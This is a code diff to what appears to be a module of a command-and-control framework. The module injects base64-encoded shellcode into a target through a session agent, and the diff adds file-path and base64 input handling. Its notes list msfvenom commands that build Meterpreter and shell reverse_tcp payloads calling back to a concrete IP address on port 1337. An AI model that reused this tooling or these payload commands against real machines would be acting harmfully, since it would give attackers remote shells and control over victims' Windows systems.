@@ -22,15 +22,15 @@ def get_info():
                 "required": True
             },
             "shellcode": {
-                "description": "The shellcode to inject, either as raw bytes, hex string, or msfvenom base64 output",
+                "description": "The shellcode to inject as msfvenom base64 output",
                 "required": True
             }
         },
         "notes": {
             "msfvenom_examples": [
-                "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=89.116.49.235 LPORT=1337 -f raw | base64",
-                "msfvenom -p windows/x64/exec CMD='calc.exe' -f raw | base64",
-                "msfvenom -p windows/x64/shell_reverse_tcp LHOST=89.116.49.235 LPORT=1337 -f raw | base64"
+                "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=89.116.49.235 LPORT=1337 -f raw | base64 -w 0",
+                "msfvenom -p windows/x64/exec CMD='calc.exe' -f raw | base64 -w 0",
+                "msfvenom -p windows/x64/shell_reverse_tcp LHOST=89.116.49.235 LPORT=1337 -f raw | base64 -w 0"
             ]
         }
     }
@@ -54,16 +54,38 @@ def execute(options, session):
 
     session.current_agent = agent_id
 
-    try:
-        shellcode_bytes = process_shellcode_input(shellcode_input)
-    except ValueError as e:
-        return {
-            "success": False,
-            "error": f"Invalid shellcode format: {str(e)}"
-        }
+    # Check if shellcode_input is a file path by checking if it's a valid file
+    if os.path.exists(shellcode_input):
+        # This is a file path, read the content
+        try:
+            with open(shellcode_input, 'r') as f:
+                file_content = f.read().strip()
+            # The file content should be base64 encoded shellcode
+            shellcode_input = file_content
+        except Exception as e:
+            return {
+                "success": False,
+                "error": f"Failed to read file {shellcode_input}: {str(e)}"
+            }
 
-    # Base64 encode the shellcode bytes
-    encoded_shellcode = base64.b64encode(shellcode_bytes).decode('utf-8')
+    # Check if shellcode_input is already base64 encoded content (indicates client-side file)
+    is_base64_content = _is_base64(shellcode_input)
+
+    if is_base64_content:
+        # The shellcode_input is already base64 encoded content from the client
+        encoded_shellcode = shellcode_input
+    else:
+        # The shellcode_input is not base64, so process it as before
+        try:
+            shellcode_bytes = process_shellcode_input(shellcode_input)
+        except ValueError as e:
+            return {
+                "success": False,
+                "error": f"Invalid shellcode format: {str(e)}"
+            }
+
+        # Base64 encode the shellcode bytes
+        encoded_shellcode = base64.b64encode(shellcode_bytes).decode('utf-8')
 
     command = f"shellcode {encoded_shellcode}"
 
@@ -103,6 +125,36 @@ def execute(options, session):
                 "success": False,
                 "error": f"Error queuing task: {str(e)}"
             }
+
+
+def _is_base64(s):
+    try:
+        # Check if the string contains only valid base64 characters
+        if not re.match(r'^[A-Za-z0-9+/]*={0,2}$', s):
+            return False
+
+        # Pad the string if necessary for decoding
+        padded = s
+        padding_needed = len(s) % 4
+        if padding_needed:
+            padded = s + '=' * (4 - padding_needed)
+
+        # Try to decode
+        decoded = base64.b64decode(padded, validate=True)
+
+        # Re-encode the decoded content
+        re_encoded = base64.b64encode(decoded).decode('utf-8')
+
+        # Check if the re-encoded version matches the original when both are padded the same way
+        # Pad the original to 4-byte boundary for comparison
+        orig_padded = s
+        orig_padding_needed = len(s) % 4
+        if orig_padding_needed:
+            orig_padded = s + '=' * (4 - orig_padding_needed)
+
+        return re_encoded == orig_padded
+    except Exception:
+        return False
 
 
 def process_shellcode_input(shellcode_input):
